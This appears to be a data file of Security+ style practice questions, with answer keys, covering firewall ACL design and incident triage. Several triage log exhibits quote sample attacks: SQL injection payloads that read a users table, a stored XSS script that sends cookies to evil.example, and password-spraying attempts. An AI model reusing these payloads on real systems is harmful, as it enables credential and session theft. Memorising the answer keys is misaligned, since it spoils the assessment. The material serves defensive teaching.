    summary: "Segmenting RADIUS lets wireless controllers reach only UDP 1812/1813 on the RADIUS host, while an explicit deny blocks lateral movement into the rest of the management VLAN."
  },
  {
    id: "PBQ-019",
    format: 1,
    domain: 3,
    title: "LDAP / LDAPS Directory Access",
    brief: "Application servers query a directory server. Enforce encrypted LDAPS, deny clear-text LDAP egress, and prevent the app tier from reaching anything else in the directory segment.",
    exhibitTitle: "Directory Services ACL",
    exhibit: "  App Tier 10.50.2.0/24 ---> [<span class='cy'>FW</span>] ---> Directory 10.60.3.10\n\n RULE ACTION SOURCE         DEST          PORT  PROTO\n  10   ?     10.50.2.0/24   10.60.3.10    <span class='hl'>?</span>   TCP\n  20  <span class='hl'>?</span>     10.50.2.0/24   10.60.3.10    389   TCP\n  99  DENY  ANY            ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (encrypted directory)", hint: "LDAP over TLS", options: ["389", "636", "161", "80"], answer: 1, explain: "LDAPS (LDAP over TLS) uses TCP 636; this is the port to permit." },
      { label: "Rule 10 ACTION", hint: "Encrypted directory lookups are allowed", options: ["Permit", "Deny", "Log only", "Redirect"], answer: 0, explain: "Encrypted LDAPS queries from the app tier to the directory are explicitly permitted." },
      { label: "Rule 20 ACTION (port 389 clear-text LDAP)", hint: "Plain LDAP exposes credentials", options: ["Permit", "Deny", "Permit with log", "Permit ICMP"], answer: 1, explain: "Clear-text LDAP on 389 should be denied so only the encrypted 636 path is usable, protecting credentials in transit." },
      { label: "Why deny 389 while permitting 636", hint: "Confidentiality of bind credentials", options: ["389 is faster", "LDAPS encrypts the session so credentials and queries are not exposed", "636 is UDP", "389 is required for Kerberos"], answer: 1, explain: "LDAPS encrypts the bind and queries; denying clear-text 389 prevents credential disclosure and downgrade." }
    ],
    summary: "Directory access is hardened by permitting only LDAPS (TCP 636), denying clear-text LDAP (389), and falling through to an implicit deny for any other directory traffic."
  },
  {
    id: "PBQ-020",
    format: 1,
    domain: 3,
    title: "Blocking SMB Egress",
    brief: "To contain ransomware and data exfiltration, block SMB from leaving the corporate network while still allowing internal file sharing. Configure the egress rule on the perimeter firewall.",
    exhibitTitle: "Perimeter Egress Filter",
    exhibit: "  CORP LAN 10.0.0.0/8 ---> [<span class='cy'>EDGE FW</span>] ---> INTERNET\n\n RULE ACTION SOURCE       DEST          PORT      PROTO\n  10  PERMIT 10.0.0.0/8   10.0.0.0/8    445       TCP  <span class='ok'>(internal)</span>\n  20   <span class='hl'>?</span>    10.0.0.0/8   <span class='hl'>?</span>     <span class='hl'>?</span>   TCP\n  99  DENY   ANY          ANY           ANY       ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 20 ACTION", hint: "SMB should never traverse the Internet", options: ["Permit", "Deny", "Permit with NAT", "Forward"], answer: 1, explain: "SMB egress to the Internet must be denied to block worm propagation and exfiltration over file sharing." },
      { label: "Rule 20 DESTINATION", hint: "Where SMB is being blocked from going", options: ["10.0.0.0/8", "0.0.0.0/0 (Internet)", "127.0.0.1", "172.16.0.0/12"], answer: 1, explain: "The block targets SMB leaving toward any external/Internet destination (0.0.0.0/0), while internal SMB stays permitted by rule 10." },
      { label: "Rule 20 PORT (primary SMB)", hint: "Modern SMB direct-host port", options: ["3389", "445", "53", "3306"], answer: 1, explain: "SMB runs on TCP 445 (legacy NetBIOS 137-139 should also be blocked outbound)." },
      { label: "Why permit internal SMB but deny egress", hint: "Business need vs. threat surface", options: ["SMB is encrypted on the Internet", "Internal file sharing is a business need; external SMB is a common ransomware and exfil vector", "445 is UDP externally", "Egress SMB improves performance"], answer: 1, explain: "Internal sharing is legitimate, but no business reason exists to send SMB across the Internet, so egress is denied to reduce the attack surface." }
    ],
    summary: "Blocking SMB (TCP 445) egress at the perimeter stops ransomware spread and exfiltration over file sharing while internal SMB remains permitted."
  },
  {
    id: "PBQ-021",
    format: 1,
    domain: 3,
    title: "Container Microsegmentation",
    brief: "In a Kubernetes-style cluster, a frontend pod tier must reach a backend API tier on one port only, and nothing should reach the database tier except the API. Build the microsegmentation rules.",
    exhibitTitle: "East-West Pod Policy",
    exhibit: "  frontend 10.244.1.0/24\n      |  (port 8443)\n  backend-api 10.244.2.0/24\n      |  (port 3306)\n  db 10.244.3.0/24\n\n RULE ACTION SOURCE          DEST            PORT  PROTO\n  10   ?     10.244.1.0/24   10.244.2.0/24   <span class='hl'>8443</span> TCP\n  20   ?     10.244.2.0/24   10.244.3.0/24   <span class='hl'>?</span>  TCP\n  30  DENY  10.244.1.0/24   10.244.3.0/24   ANY   ANY\n  99  DENY  ANY             ANY             ANY   ANY <span class='ok'>(default)</span>",
    fields: [
      { label: "Rule 10 ACTION (frontend to API)", hint: "Allowed east-west path", options: ["Deny", "Permit", "Drop", "Tarpit"], answer: 1, explain: "The frontend tier is permitted to call the backend API on its single service port." },
      { label: "Rule 20 PORT (API to database)", hint: "MySQL-compatible database port", options: ["1433", "3306", "5432", "27017"], answer: 1, explain: "The API tier reaches the database on TCP 3306 (MySQL). Only the API is allowed this path." },
      { label: "Rule 30 purpose", hint: "Frontend must never touch the DB", options: ["Allows DB backups", "Enforces least privilege by denying frontend any direct database access", "Permits ICMP to DB", "Enables replication"], answer: 1, explain: "Rule 30 explicitly denies the frontend tier any path to the database, forcing traffic through the API and limiting blast radius." },
      { label: "Overall principle of this policy", hint: "Default posture between pods", options: ["Allow-all with logging", "Zero-trust microsegmentation: deny by default, permit only required tier-to-tier flows", "Flat network", "Trust by namespace"], answer: 1, explain: "Each tier only talks to its required neighbor on a specific port, with a default deny, which is zero-trust microsegmentation." }
    ],
    summary: "Container microsegmentation permits only required tier-to-tier ports (frontend to API 8443, API to DB 3306) and denies all other east-west traffic by default."
  },
  {
    id: "PBQ-022",
    format: 1,
    domain: 3,
    title: "Guest Wi-Fi Isolation",
    brief: "A guest wireless VLAN must reach the Internet but never the corporate LAN or other guests. Order the rules correctly so isolation is enforced before any Internet allow.",
    exhibitTitle: "Guest VLAN ACL",
    exhibit: "  Guest VLAN 192.168.50.0/24\n      |\n   [<span class='cy'>FW / GW</span>]\n     /        \\\n  CORP 10.0.0.0/8   INTERNET\n\n RULE ACTION SOURCE            DEST           PORT PROTO\n  10   <span class='hl'>?</span>    192.168.50.0/24  10.0.0.0/8     ANY  ANY\n  20   <span class='hl'>?</span>    192.168.50.0/24  192.168.50.0/24 ANY ANY\n  30  PERMIT 192.168.50.0/24  <span class='hl'>?</span>     ANY  ANY\n  99  DENY  ANY              ANY            ANY  ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 ACTION (guest to corporate)", hint: "Guests must not reach the LAN", options: ["Permit", "Deny", "NAT", "Inspect"], answer: 1, explain: "Guest traffic to the corporate network must be denied to keep the guest segment isolated." },
      { label: "Rule 20 ACTION (guest to guest)", hint: "Client isolation", options: ["Permit", "Deny", "Bridge", "Mirror"], answer: 1, explain: "Peer-to-peer guest traffic should be denied (client isolation) so guests cannot attack each other." },
      { label: "Rule 30 DESTINATION (Internet allow)", hint: "Only the public Internet remains", options: ["10.0.0.0/8", "0.0.0.0/0", "192.168.50.0/24", "172.16.0.0/12"], answer: 1, explain: "After isolation, guests are permitted only to 0.0.0.0/0 (the Internet)." },
      { label: "Why must rules 10/20 precede rule 30", hint: "First-match ACL processing", options: ["Order is irrelevant", "ACLs are evaluated top-down first-match, so deny rules must precede the broad Internet permit", "Permit always wins", "Rule 99 runs first"], answer: 1, explain: "Firewalls evaluate top-down and stop at the first match; the corporate/peer denies must come before the broad Internet permit or they would never be reached." }
    ],
    summary: "Guest Wi-Fi isolation denies guest-to-corporate and guest-to-guest traffic first, then permits Internet-only access, relying on correct top-down rule ordering."
  },
  {
    id: "PBQ-023",
    format: 1,
    domain: 3,
    title: "SCADA Cell Protection",
    brief: "An OT/SCADA cell containing PLCs must be protected behind an industrial firewall. Permit only the engineering workstation to the historian and PLCs on required ports and deny all general IT traffic.",
    exhibitTitle: "ICS Cell ACL (Purdue L2/L3)",
    exhibit: "  IT NET 10.1.0.0/16\n      |\n  [<span class='cy'>OT FW</span>]  <-- conduit\n      |\n  SCADA CELL 10.2.5.0/24  (PLCs 10.2.5.20-29, Historian 10.2.5.5)\n\n RULE ACTION SOURCE        DEST          PORT  PROTO\n  10   ?     10.1.0.0/16   10.2.5.5      <span class='hl'>?</span>   TCP  <span class='dim'>(historian)</span>\n  20  PERMIT 10.2.5.0/24   10.2.5.0/24   502   TCP  <span class='dim'>(Modbus)</span>\n  30   <span class='hl'>?</span>    10.1.0.0/16   10.2.5.0/24   ANY   ANY\n  99  DENY  ANY           ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (IT to historian)", hint: "Encrypted historian/web query", options: ["443", "23", "21", "502"], answer: 0, explain: "Allowing only HTTPS (443) to the historian gives IT read access to OT data without exposing control protocols." },
      { label: "Rule 10 ACTION", hint: "Limited historian access is intended", options: ["Permit", "Deny", "Drop", "Reset"], answer: 0, explain: "A narrow permit lets IT pull data from the historian; everything else stays denied." },
      { label: "Rule 30 ACTION (general IT into the cell)", hint: "Protect the control protocols", options: ["Permit", "Deny", "Log only", "NAT"], answer: 1, explain: "Broad IT access into the SCADA cell must be denied so Modbus/PLC control traffic is never reachable from IT." },
      { label: "Why is Modbus (502) only permitted intra-cell", hint: "Modbus has no authentication/encryption", options: ["It is too fast for IT", "Modbus is unauthenticated and unencrypted, so it must stay inside the protected cell", "502 is UDP", "IT needs Modbus for email"], answer: 1, explain: "Modbus/TCP (502) lacks authentication and encryption, so it is confined to the OT cell and never exposed across the IT conduit." }
    ],
    summary: "SCADA cell protection permits only narrow IT-to-historian access (443) and confines unauthenticated control protocols like Modbus (502) to within the cell, denying all other IT traffic."
  },
  {
    id: "PBQ-024",
    format: 1,
    domain: 3,
    title: "DNS Egress Hardening",
    brief: "Only the internal DNS resolvers should be allowed to query the Internet on port 53; all other clients must use the internal resolvers. Build the rules to prevent DNS tunneling from endpoints.",
    exhibitTitle: "DNS Egress ACL",
    exhibit: "  Clients 10.5.0.0/16    Resolvers 10.5.0.0/16 (.53, .54)\n        \\        /\n        [<span class='cy'>EDGE FW</span>]\n           |\n        INTERNET\n\n RULE ACTION SOURCE        DEST        PORT PROTO\n  10  PERMIT 10.5.0.53     0.0.0.0/0   53   <span class='hl'>?</span>\n  20  PERMIT 10.5.0.54     0.0.0.0/0   53   UDP\n  30   <span class='hl'>?</span>    10.5.0.0/16   0.0.0.0/0   <span class='hl'>53</span>  ANY\n  99  DENY  ANY           ANY         ANY  ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PROTOCOL for DNS", hint: "Standard DNS query transport", options: ["TCP only", "UDP (with TCP for large/zone transfers)", "ICMP", "GRE"], answer: 1, explain: "DNS queries use UDP 53 primarily, with TCP 53 for large responses and zone transfers; both go from the resolvers only." },
      { label: "Rule 30 ACTION", hint: "Other clients must not query Internet DNS directly", options: ["Permit", "Deny", "Forward", "Cache"], answer: 1, explain: "All non-resolver clients are denied outbound 53 so they cannot bypass the resolvers or run DNS tunneling." },
      { label: "Rule 30 PORT being blocked", hint: "Which service the clients are denied", options: ["53", "80", "443", "123"], answer: 0, explain: "Outbound port 53 is denied for general clients, forcing them through the sanctioned internal resolvers." },
      { label: "Security benefit of this design", hint: "Funneling DNS through resolvers", options: ["Faster browsing only", "Prevents DNS tunneling/exfiltration and enables monitoring by allowing only resolvers to query externally", "Disables DNS entirely", "Enables split tunneling"], answer: 1, explain: "Restricting external DNS to the resolvers blocks endpoint-based DNS tunneling and centralizes logging and filtering." }
    ],
    summary: "DNS egress hardening permits only the internal resolvers to query the Internet on UDP/TCP 53 and denies all other clients, defeating DNS tunneling and centralizing control."
  },
  {
    id: "PBQ-025",
    format: 1,
    domain: 3,
    title: "Jump Host / Bastion RDP Access",
    brief: "Administrators must reach internal servers via RDP only through a hardened jump host. Permit admin VLAN to the bastion, the bastion to servers, and deny direct admin-to-server RDP.",
    exhibitTitle: "Bastion Access ACL",
    exhibit: "  Admin VLAN 10.7.1.0/24\n      |\n  Bastion 10.7.9.9\n      |\n  Servers 10.8.0.0/16\n\n RULE ACTION SOURCE         DEST          PORT  PROTO\n  10   ?     10.7.1.0/24    10.7.9.9      <span class='hl'>?</span>  TCP\n  20  PERMIT 10.7.9.9       10.8.0.0/16   3389  TCP\n  30   <span class='hl'>?</span>    10.7.1.0/24    10.8.0.0/16   3389  TCP\n  99  DENY  ANY            ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (admin to bastion)", hint: "Remote Desktop port", options: ["22", "3389", "443", "5900"], answer: 1, explain: "Admins connect to the jump host over RDP (TCP 3389); the bastion then relays to servers." },
      { label: "Rule 10 ACTION", hint: "Admins reach the bastion", options: ["Permit", "Deny", "Reset", "Throttle"], answer: 0, explain: "Admin access to the bastion on 3389 is explicitly permitted as the single entry point." },
      { label: "Rule 30 ACTION (admin direct to servers)", hint: "Bypassing the bastion must fail", options: ["Permit", "Deny", "Permit with log", "NAT"], answer: 1, explain: "Direct admin-to-server RDP is denied so all access is forced through the audited jump host." },
      { label: "Why funnel RDP through a bastion", hint: "Auditing and attack surface", options: ["RDP is faster via bastion", "It centralizes logging/MFA and shrinks the RDP attack surface to one hardened host", "3389 becomes UDP", "It disables RDP encryption"], answer: 1, explain: "A bastion concentrates monitoring, MFA, and session recording on one hardened host and prevents broad RDP exposure across all servers." }
    ],
    summary: "A bastion design permits admin RDP only to the jump host and the jump host to servers, denying direct admin-to-server RDP to centralize auditing and reduce exposure."
  },
  {
    id: "PBQ-026",
    format: 1,
    domain: 3,
    title: "Database Tier Isolation",
    brief: "Only the application servers may reach the PostgreSQL database; admins reach it solely through the bastion. Deny web servers and all other hosts from the database port.",
    exhibitTitle: "Three-Tier DB ACL",
    exhibit: "  Web 10.11.1.0/24   App 10.11.2.0/24   Bastion 10.11.9.9\n                 \\     |     /\n               [<span class='cy'>FW</span>] DB 10.11.3.0/24\n\n RULE ACTION SOURCE         DEST           PORT  PROTO\n  10   ?     10.11.2.0/24   10.11.3.0/24   <span class='hl'>?</span>  TCP\n  20  PERMIT 10.11.9.9      10.11.3.0/24   5432  TCP\n  30   <span class='hl'>?</span>    10.11.1.0/24   10.11.3.0/24   5432  TCP\n  99  DENY  ANY            ANY            ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (PostgreSQL)", hint: "Default Postgres listener", options: ["3306", "1433", "5432", "1521"], answer: 2, explain: "PostgreSQL listens on TCP 5432, which the app tier is permitted to reach." },
      { label: "Rule 10 ACTION", hint: "App tier must query the DB", options: ["Permit", "Deny", "Log only", "Mirror"], answer: 0, explain: "The application tier is the legitimate consumer of the database and is explicitly permitted." },
      { label: "Rule 30 ACTION (web tier to DB)", hint: "Web servers should not touch the DB", options: ["Permit", "Deny", "Forward", "NAT"], answer: 1, explain: "Web servers must not reach the database directly; this is denied to enforce the three-tier boundary." },
      { label: "Best-practice principle", hint: "Limit who can reach the data tier", options: ["Allow any internal host", "Least privilege: only the app tier and the audited bastion may reach 5432", "Public DB exposure", "Trust the whole subnet"], answer: 1, explain: "Restricting 5432 to the app tier and bastion only embodies least privilege and limits the database attack surface." }
    ],
    summary: "Database isolation permits PostgreSQL (5432) only from the app tier and the bastion, denying the web tier and all other hosts to preserve the three-tier boundary."
  },
  {
    id: "PBQ-027",
    format: 1,
    domain: 3,
    title: "SNMP Monitoring Segmentation",
    brief: "An NMS polls network devices via SNMP. Permit only the NMS to poll devices on the management VLAN and deny SNMP from everywhere else to prevent enumeration.",
    exhibitTitle: "SNMP Polling ACL",
    exhibit: "  NMS 10.3.0.10\n      |\n  [<span class='cy'>FW</span>]\n      |\n  MGMT Devices 10.3.9.0/24\n\n RULE ACTION SOURCE       DEST          PORT  PROTO\n  10   ?     10.3.0.10    10.3.9.0/24   <span class='hl'>?</span>   <span class='hl'>?</span>\n  20   <span class='hl'>?</span>    ANY          10.3.9.0/24   161   UDP\n  99  DENY  ANY          ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (SNMP poll)", hint: "SNMP agent listening port", options: ["161", "162", "514", "123"], answer: 0, explain: "SNMP polling targets UDP 161 on the agents (162 is for traps to the manager)." },
      { label: "Rule 10 PROTOCOL", hint: "SNMP transport", options: ["TCP", "UDP", "ICMP", "GRE"], answer: 1, explain: "SNMP polling uses UDP (161)." },
      { label: "Rule 10 ACTION", hint: "NMS must be able to poll", options: ["Permit", "Deny", "Drop", "Reset"], answer: 0, explain: "Only the NMS is permitted to poll SNMP agents; this explicit permit precedes the broad deny." },
      { label: "Rule 20 ACTION (any host SNMP)", hint: "Prevent enumeration by others", options: ["Permit", "Deny", "Log only", "NAT"], answer: 1, explain: "SNMP from any other source is denied to stop device enumeration and community-string abuse; use SNMPv3 for confidentiality." }
    ],
    summary: "SNMP segmentation permits only the NMS to poll agents on UDP 161 and denies SNMP from all other hosts to prevent enumeration, ideally paired with SNMPv3."
  },
  {
    id: "PBQ-028",
    format: 1,
    domain: 3,
    title: "Outbound Web Proxy Enforcement",
    brief: "All web browsing must go through the forward proxy. Permit only the proxy to reach the Internet on 80/443 and deny clients from making direct outbound web connections.",
    exhibitTitle: "Forward Proxy Egress ACL",
    exhibit: "  Clients 10.12.0.0/16   Proxy 10.12.0.8\n              \\        /\n            [<span class='cy'>EDGE FW</span>]\n                |\n             INTERNET\n\n RULE ACTION SOURCE         DEST        PORT     PROTO\n  10  PERMIT 10.12.0.8      0.0.0.0/0   80,443   TCP\n  20   <span class='hl'>?</span>    10.12.0.0/16   0.0.0.0/0   <span class='hl'>?</span>  TCP\n  99  DENY  ANY            ANY         ANY      ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 20 ACTION (direct client web)", hint: "Clients must use the proxy", options: ["Permit", "Deny", "Forward", "NAT"], answer: 1, explain: "Direct client web egress is denied so every request is forced through the inspecting forward proxy." },
      { label: "Rule 20 PORTS being blocked", hint: "The web ports clients try to use directly", options: ["22 and 3389", "80 and 443", "53 and 123", "389 and 636"], answer: 1, explain: "Clients are denied direct outbound 80/443; only the proxy may use those ports to the Internet." },
      { label: "Rule 10 PROTOCOL for 80/443", hint: "HTTP/HTTPS transport", options: ["UDP", "TCP", "ICMP", "ESP"], answer: 1, explain: "HTTP (80) and HTTPS (443) are TCP services; the proxy is permitted on TCP." },
      { label: "Benefit of forcing traffic through the proxy", hint: "Visibility and control", options: ["Anonymity for clients", "Centralized URL filtering, TLS inspection, and logging of all web traffic", "Faster DNS", "Bypassing authentication"], answer: 1, explain: "Funneling all web traffic through the proxy enables content filtering, inspection, DLP, and complete logging while preventing direct egress." }
    ],
    summary: "Forward-proxy enforcement permits only the proxy outbound on 80/443 and denies direct client web egress, centralizing filtering, inspection, and logging."
  },
  {
    id: "PBQ-029",
    format: 1,
    domain: 3,
    title: "NTP Time Source Control",
    brief: "Internal hosts must sync time only from the local NTP servers, which in turn sync from approved upstream sources. Prevent endpoints from reaching arbitrary Internet time servers.",
    exhibitTitle: "NTP Hierarchy ACL",
    exhibit: "  Hosts 10.14.0.0/16   NTP srv 10.14.0.5/.6\n             \\        /\n           [<span class='cy'>EDGE FW</span>]\n               |\n            INTERNET\n\n RULE ACTION SOURCE         DEST          PORT  PROTO\n  10  PERMIT 10.14.0.5      0.0.0.0/0     <span class='hl'>?</span>   <span class='hl'>?</span>\n  20   <span class='hl'>?</span>    10.14.0.0/16   0.0.0.0/0     123   UDP\n  99  DENY  ANY            ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 PORT (NTP)", hint: "Network Time Protocol port", options: ["123", "161", "514", "53"], answer: 0, explain: "NTP uses UDP 123; only the local NTP servers are permitted outbound to upstream sources." },
      { label: "Rule 10 PROTOCOL", hint: "NTP transport", options: ["TCP", "UDP", "ICMP", "GRE"], answer: 1, explain: "NTP runs over UDP 123." },
      { label: "Rule 20 ACTION (host NTP egress)", hint: "Endpoints should use internal NTP only", options: ["Permit", "Deny", "Forward", "NAT"], answer: 1, explain: "General hosts are denied outbound 123 so they must sync from the internal time servers, ensuring consistent, trusted time." },
      { label: "Why control the time source", hint: "Impact of skewed time", options: ["Time is cosmetic", "Consistent trusted time underpins logging, certificates, Kerberos, and forensic correlation", "It speeds up NTP", "It disables logging"], answer: 1, explain: "Accurate, centrally controlled time is essential for log correlation, certificate validity, and Kerberos, and prevents tampering via rogue time servers." }
    ],
    summary: "NTP control permits only internal time servers outbound on UDP 123 and denies host-level NTP egress, preserving trusted time for logging, certs, and Kerberos."
  },
  {
    id: "PBQ-030",
    format: 1,
    domain: 3,
    title: "Extranet Partner B2B Access",
    brief: "A business partner connects over a dedicated link to a single B2B application server. Restrict the partner to exactly one host and port and deny any other access into the internal network.",
    exhibitTitle: "Partner Extranet ACL",
    exhibit: "  PARTNER 198.51.100.0/24\n      |  (dedicated circuit)\n  [<span class='cy'>FW</span>]\n      |\n  B2B App 10.20.7.30   INTERNAL 10.20.0.0/16\n\n RULE ACTION SOURCE             DEST          PORT  PROTO\n  10   ?     198.51.100.0/24    <span class='hl'>10.20.7.30</span> 443   TCP\n  20   <span class='hl'>?</span>    198.51.100.0/24    10.20.0.0/16  ANY   ANY\n  99  DENY  ANY                ANY           ANY   ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 ACTION (partner to B2B app)", hint: "The single intended service", options: ["Permit", "Deny", "Log only", "Reset"], answer: 0, explain: "The partner is permitted only to the one B2B application host on 443; this is the sole intended flow." },
      { label: "Rule 10 DESTINATION", hint: "Exactly one host, not a subnet", options: ["10.20.0.0/16", "10.20.7.30/32", "0.0.0.0/0", "198.51.100.0/24"], answer: 1, explain: "Least privilege restricts the partner to the single host 10.20.7.30/32, never the whole internal subnet." },
      { label: "Rule 20 ACTION (partner to rest of internal)", hint: "Contain the partner", options: ["Permit", "Deny", "NAT", "Forward"], answer: 1, explain: "All other partner access into the internal network is denied so a compromised partner cannot pivot beyond the one app." },
      { label: "Rule 10 PORT/PROTOCOL", hint: "Encrypted B2B web service", options: ["80 / TCP", "443 / TCP", "22 / TCP", "3389 / TCP"], answer: 1, explain: "The B2B service is reached over HTTPS (443/TCP); no other ports are opened to the partner." }
    ],
    summary: "Extranet B2B access permits the partner to exactly one host on 443/TCP and denies any other internal access, applying strict least privilege to contain partner risk."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-031",
    format: 2,
    domain: 4,
    title: "SQL Injection Against Storefront",
    brief: "The web application firewall flagged repeated odd parameters against the product search endpoint. A junior analyst escalated the access log for triage.",
    exhibitTitle: "/var/log/apache2/access.log",
    exhibit: "<span class='dim'>10.0.4.11 - - [26/Jun/2026:08:14:02] \"GET /search?q=laptop HTTP/1.1\" 200 4821</span>\n<span class='ok'>10.0.4.11 - - [26/Jun/2026:08:14:09] \"GET /search?q=monitor HTTP/1.1\" 200 3902</span>\n<span class='hl'>203.0.113.77 - - [26/Jun/2026:08:21:55] \"GET /search?q=x' OR '1'='1 HTTP/1.1\" 200 88210</span>\n<span class='hl'>203.0.113.77 - - [26/Jun/2026:08:22:10] \"GET /search?q=x' UNION SELECT username,password FROM users-- HTTP/1.1\" 200 91044</span>\n<span class='hl'>203.0.113.77 - - [26/Jun/2026:08:22:31] \"GET /search?q=x';WAITFOR DELAY '0:0:5'-- HTTP/1.1\" 200 1203</span>\n<span class='cy'>User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)</span>\n<span class='warnc'>db-audit: 08:22:11 SELECT on table users returned 4,512 rows to web_app account</span>",
    fields: [
      {
        label: "Primary attack vector",
        hint: "Look at the query strings and the table being read.",
        options: ["Cross-site scripting", "SQL injection", "Directory traversal", "Server-side request forgery"],
        answer: 1,
        explain: "The payloads use UNION SELECT and boolean/time-based clauses (OR '1'='1, WAITFOR DELAY) against a database column, and the sqlmap user agent confirms automated SQL injection."
      },
      {
        label: "Severity rating",
        hint: "An entire credentials table was returned to the attacker.",
        options: ["Informational", "Low", "Medium", "Critical"],
        answer: 3,
        explain: "The UNION query exfiltrated the full users table including password fields, confirming successful data exposure. Confirmed credential theft is rated Critical."
      },
      {
        label: "Correct first containment action",
        hint: "Stop the source from reaching the vulnerable endpoint right now.",
        options: ["Rebuild the database server", "Block source IP 203.0.113.77 at the WAF and edge firewall", "Email the developers to patch the query", "Restore the database from backup"],
        answer: 1,
        explain: "Containment must immediately cut the attacker's access. Blocking 203.0.113.77 at the WAF/edge stops the active extraction while deeper fixes are planned. Patching and rebuilding are later phases."
      },
      {
        label: "Eradication follow-up",
        hint: "Address the root cause in the code, not just the network.",
        options: ["Parameterize the search query and remove dynamic SQL", "Increase the web server log retention", "Add a CAPTCHA to the homepage", "Reboot the load balancer"],
        answer: 0,
        explain: "Eradication removes the vulnerability: replace string-concatenated SQL with parameterized queries (prepared statements) so injected input cannot alter query structure."
      }
    ],
    summary: "Automated SQL injection (sqlmap) extracted the users table. Block the source IP to contain, then parameterize queries and rotate exposed credentials to eradicate and recover."
  },
  {
    id: "PBQ-032",
    format: 2,
    domain: 4,
    title: "Stored XSS in Support Portal",
    brief: "Support agents reported pop-ups and redirects when opening certain customer tickets. The SIEM correlated the events to a single submitted ticket body.",
    exhibitTitle: "siem://search index=webapp sourcetype=ticket_submit",
    exhibit: "<span class='ok'>2026-06-26 09:02:11 ticket=4471 user=cust8821 field=body len=212 status=clean</span>\n<span class='hl'>2026-06-26 09:05:44 ticket=4488 user=cust9007 field=body=\"&lt;script&gt;document.location='https://evil.example/c?'+document.cookie&lt;/script&gt;\"</span>\n<span class='hl'>2026-06-26 09:18:02 agent=jsmith opened ticket=4488 -> outbound GET https://evil.example/c?session=AGENT_SID</span>\n<span class='warnc'>2026-06-26 09:18:03 csp-report: blocked-uri evil.example violated-directive script-src</span>\n<span class='cy'>2026-06-26 09:18:05 auth: new session for jsmith from 198.51.100.42 (different ASN)</span>\n<span class='dim'>2026-06-26 09:21:40 ticket=4490 user=cust1102 field=body len=88 status=clean</span>",
    fields: [
      {
        label: "Primary attack vector",
        hint: "Malicious script was stored and ran in another user's browser.",
        options: ["Reflected XSS", "Stored (persistent) cross-site scripting", "CSRF", "Clickjacking"],
        answer: 1,
        explain: "The script was saved in the ticket body and executed later when an agent viewed it, stealing the agent's cookie. Script persisted server-side, so this is stored XSS."
      },
      {
        label: "What did the attacker steal?",
        hint: "Follow the outbound request after the agent opened the ticket.",
        options: ["The agent's password hash", "The agent's session cookie/token", "The database schema", "TLS private keys"],
        answer: 1,
        explain: "document.cookie was sent to evil.example, and a new session for jsmith appeared from a different ASN, indicating session cookie theft and reuse."
      },
      {
        label: "Correct first containment action",
        hint: "The stolen token is being actively reused.",
        options: ["Revoke jsmith's active session tokens and force re-authentication", "Delete all customer tickets", "Reimage the support server", "Disable CSP reporting"],
        answer: 0,
        explain: "Because the agent's session was hijacked, the immediate containment is to invalidate jsmith's tokens so the attacker's session is killed before further access."
      },
      {
        label: "Eradication follow-up",
        hint: "Prevent untrusted markup from rendering.",
        options: ["Disable the support portal permanently", "Output-encode and sanitize ticket fields and enforce CSP", "Whitelist the evil.example domain", "Increase session timeout to 24 hours"],
        answer: 1,
        explain: "Eradication applies context-aware output encoding/sanitization on stored fields and enforces a strict Content-Security-Policy so injected scripts cannot run."
      }
    ],
    summary: "Stored XSS hijacked a support agent's session. Revoke the agent's tokens to contain, then sanitize/encode input and enforce CSP, and audit tickets for other payloads."
  },
  {
    id: "PBQ-033",
    format: 2,
    domain: 4,
    title: "Password Spraying on VPN Portal",
    brief: "The identity provider triggered an anomaly alert: many distinct accounts failed authentication from one address within minutes, with a single common password.",
    exhibitTitle: "siem://search index=auth source=vpn_radius",
    exhibit: "<span class='hl'>09:30:01 vpn auth FAIL user=alice src=185.220.101.5 reason=bad_password</span>\n<span class='hl'>09:30:02 vpn auth FAIL user=bob src=185.220.101.5 reason=bad_password</span>\n<span class='hl'>09:30:02 vpn auth FAIL user=carol src=185.220.101.5 reason=bad_password</span>\n<span class='hl'>09:30:03 vpn auth FAIL user=dave src=185.220.101.5 reason=bad_password</span>\n<span class='dim'>... 142 distinct usernames, 1 attempt each, password hash identical across all ...</span>\n<span class='warnc'>09:31:55 vpn auth SUCCESS user=evan src=185.220.101.5 mfa=not_enrolled</span>\n<span class='cy'>09:32:10 vpn session established user=evan internal_ip=10.8.0.55</span>",
    fields: [
      {
        label: "Primary attack vector",
        hint: "One password tried against many accounts, not many passwords against one.",
        options: ["Credential stuffing with breached pairs", "Password spraying", "Kerberoasting", "Brute force against one account"],
        answer: 1,
        explain: "A single common password was tried once across 142 distinct accounts from one IP. Low attempts per account to avoid lockout defines password spraying."
      },
      {
        label: "Severity rating",
        hint: "One account without MFA actually logged in.",
        options: ["Informational", "Low", "Medium", "High"],
        answer: 3,
        explain: "The spray succeeded against evan, who lacked MFA, granting VPN access to the internal network. A successful intrusion is High severity."
      },
      {
        label: "Correct first containment action",
        hint: "One specific account is now controlled by the attacker.",
        options: ["Disable evan's account and terminate the VPN session", "Reset every employee password company-wide", "Shut down the VPN concentrator", "Block all inbound internet traffic"],
        answer: 0,
        explain: "Containment targets the compromised access first: disable evan and kill the active VPN session, then block the source IP, before broader hardening."
      },
      {
        label: "Eradication / hardening follow-up",
        hint: "Make the spray ineffective in the future.",
        options: ["Shorten password length requirements", "Enforce MFA for all VPN users and enable spray-aware lockout", "Disable the SIEM alert", "Allow the source IP for monitoring"],
        answer: 1,
        explain: "Enforcing MFA defeats password-only spraying, and source-aware lockout/throttling detects low-and-slow distributed guessing. This removes the underlying weakness."
      }
    ],
